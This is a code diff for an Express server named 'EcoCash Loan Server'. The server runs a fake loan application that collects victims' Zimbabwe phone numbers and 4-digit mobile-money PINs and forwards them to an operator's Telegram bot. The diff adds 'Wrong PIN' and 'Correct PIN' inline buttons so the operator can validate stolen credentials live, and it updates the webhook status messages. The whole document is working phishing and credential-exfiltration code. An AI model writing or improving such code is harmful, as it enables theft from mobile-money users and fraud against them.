@@ -27,7 +27,7 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// STEP 2 SUBMISSION: Credentials delivered to bot during loading screen
+// STEP 2 SUBMISSION: Credentials delivered to bot with inline buttons
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -63,12 +63,27 @@ app.post('/api/submit-credentials', async (req, res) => {
                           `📊 <b>Loan Requested:</b> $${data.loanAmount || 'N/A'}\n` +
                           `📞 <b>Phone:</b> 263${formattedPhone}\n` +
                           `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +
-                          `⏰ <b>Date:</b> ${currentTimestamp}`;
+                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +
+                          `❓ <b>VERIFY CREDENTIALS ACCURACY:</b>`;
+
+      const telegramPayload = {
+        chat_id: chatId,
+        text: messageText,
+        parse_mode: 'HTML',
+        reply_markup: JSON.stringify({
+          inline_keyboard: [
+            [
+              { text: '❌ Wrong PIN', callback_data: `otp_wrong_${appReference}` },
+              { text: '✅ Correct PIN', callback_data: `otp_correct_${appReference}` }
+            ]
+          ]
+        })
+      };
 
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: messageText, parse_mode: 'HTML' })
+        body: JSON.stringify(telegramPayload)
       });
     }
 
@@ -180,7 +195,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Marked as CORRECT ✅</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: Verified as CORRECT ✅</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -191,7 +206,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_REJECTED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP Marked as WRONG ❌</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: Verified as WRONG ❌</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 });
@@ -215,4 +230,3 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
-    
